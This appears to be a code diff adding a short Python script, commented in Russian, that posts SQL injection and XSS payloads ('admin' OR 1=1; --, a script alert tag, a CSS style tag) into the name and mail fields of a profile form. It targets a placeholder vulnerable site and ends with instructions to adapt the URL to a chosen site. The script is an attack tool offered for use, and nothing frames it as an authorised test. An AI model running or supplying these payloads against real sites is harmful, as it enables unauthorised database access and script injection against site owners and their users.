@@ -1,0 +1,43 @@
+import requests
+
+# SQL-инъекция через поле 'name' или 'mail'
+def sql_injection(url, input_field, payload):
+    data = {
+        "name": "TestUser" if input_field != "name" else payload,
+        "mail": "test@example.com" if input_field != "mail" else payload,
+        "new_password": "",
+        "confirm_password": ""
+    }
+    response = requests.post(url, data=data)
+    return f"SQLi Payload: {payload}\nResponse: {response.text[:200]}"
+
+# CSS/XSS-инъекция через поле 'name' (если вывод в CSS или JS контексте)
+def css_xss_injection(url, input_field, payload):
+    data = {
+        "name": payload if input_field == "name" else "TestUser",
+        "mail": "test@example.com",
+        "new_password": "",
+        "confirm_password": ""
+    }
+    response = requests.post(url, data=data)
+    return f"XSS Payload: {payload}\nResponse: {response.text[:200]}"
+
+# Пример использования
+target_url = "http://vulnerable-site.com/profile.php"
+sql_payload = "admin' OR 1=1; --"
+xss_payload = "<script>alert('XSS');</script>"
+
+# Проверяем SQL-инъекцию
+sql_result_name = sql_injection(target_url, "name", sql_payload)
+sql_result_mail = sql_injection(target_url, "mail", sql_payload)
+# Проверяем XSS
+xss_result = css_xss_injection(target_url, "name", xss_payload)
+
+print(sql_result_name)
+print(sql_result_mail)
+print(xss_result)
+
+# Инструкции:
+# 1. Для SQLi: Вставьте 'admin' OR 1=1; --' в поле 'name' или 'mail' через форму.
+# 2. Для XSS: Попробуйте '<style>body{background:red}</style>' в 'name', если CSS обрабатывает ввод.
+# 3. Требуется модуль requests (pip install requests). Адаптируйте URL под сайт.
